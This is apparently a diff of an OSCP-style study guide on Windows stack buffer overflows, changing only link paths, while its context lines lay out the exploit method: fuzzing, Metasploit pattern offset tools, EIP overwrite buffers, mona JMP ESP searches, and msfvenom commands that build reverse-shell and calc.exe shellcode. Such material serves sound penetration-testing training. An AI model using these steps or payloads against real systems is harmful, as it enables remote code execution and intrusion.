@@ -15,14 +15,14 @@
 ## Detailed Instructions
 
  * Load service in Immunity Debugger
- * Fuzz using [Fuzzing_Script.py](/OSCP/Buffer_Overflow/Fuzzing_Scripts/Simple_Fuzz/)
- * Replicate Crash using [BOF_Skeleton.py](/OSCP/Buffer_Overflow/Skeleton/)
+ * Fuzz using [Fuzzing_Script.py](./Fuzzing_Scripts/Simple_Fuzz.html)
+ * Replicate Crash using [BOF_Skeleton.py](./Skeleton.html)
  * Find bytes by sending unique string
 	* 
 		```bash
 		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number_of_buffer>
 		```
-	* Plugin it into[BOF_Skeleton.py](/OSCP/Buffer_Overflow/Skeleton/)
+	* Plugin it into[BOF_Skeleton.py](./Skeleton.html)
 		* Swap "A"s with pattern_create output
     * `#!python !mona findmsp`
     * or
@@ -30,12 +30,12 @@
  		```bash
  		/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <number_of_buffer> -q <value_in_register>
  		```
- * Modify [BOF_Skeleton.py](/OSCP/Buffer_Overflow/Skeleton/) to `#!python "A"*<result_from_pattern_offset.rb> + "B"*4 + "C"*<value of As and Bs * original buffer used for crashing the application>`
+ * Modify [BOF_Skeleton.py](./Skeleton.html) to `#!python "A"*<result_from_pattern_offset.rb> + "B"*4 + "C"*<value of As and Bs * original buffer used for crashing the application>`
     * i.e. `#!python buffer = 'A'*2606+'B'*4+'C'*(3100-2606-4)`
  * Find where to put shellcode and redirect/replace value of the `#!asm EIP` register (Bs or `42424242`)
 	* Usually where the Cs are (`#!asm ESP`? `#!asm EAX`?) or probably the As?
 		* Find out if the As or Cs or the suitable location of payload is 350 bytes to 400 bytes in size (average size of shellcode)
-			* If not try to increase [BOF_Skeleton.py](/OSCP/Buffer_Overflow/Skeleton/) buffer size (Replicate Crashing using [BOF_Skeleton.py](/OSCP/Buffer_Overflow/Skeleton/) above)
+			* If not try to increase [BOF_Skeleton.py](./Skeleton.html) buffer size (Replicate Crashing using [BOF_Skeleton.py](./Skeleton.html) above)
 				* `#!python "C"*(NEW_SIZE * <EXISTING FORMULA>)`
 					* i.e. `#!python "C"*2700-2606-4`
 					* i.e. `#!python "C"*3500-2606-4`
@@ -107,7 +107,7 @@
 						    * i.e. `#!python !mona find -s "\xff\xe4" -m slmfc.dll`
 						    * choose address that does not contain any bad characters
 				    * Go to address and verify `#!asm JMP <REGISTER>` code
-				    * copy the address and replace the "B"s in [BOF_Skeleton.py](/OSCP/Buffer_Overflow/Skeleton/)
+				    * copy the address and replace the "B"s in [BOF_Skeleton.py](./Skeleton.html)
 					    * remember to write address in reverse because x86 arch stores address in memory using little endian format
 				    * test the code and place a breakpoint ++f2++ on the `#!asm JMP <REGISTER>` address just to see if on the actual BOF, it places the right address in the right order in `#!asm EIP`
 				
@@ -131,7 +131,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> EXITFUNC=<process/thread/seh
 		msfvenom -p windows/exec EXITFUNC=thread CMD=calc.exe -f python -v shellcode_calc -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai
 		```
 	* other payload = 
-	* copy shellcode to [BOF_Skeleton.py](/OSCP/Buffer_Overflow/Skeleton/)
+	* copy shellcode to [BOF_Skeleton.py](./Skeleton.html)
 	* Adjust buffer length
 		* i.e. `#!python "A"*2606 + "\x8f\x35\x4a\x5f" + shellcode + "C"*(3500-2606-4-351)`
 	* Decoder Stub avoidance:
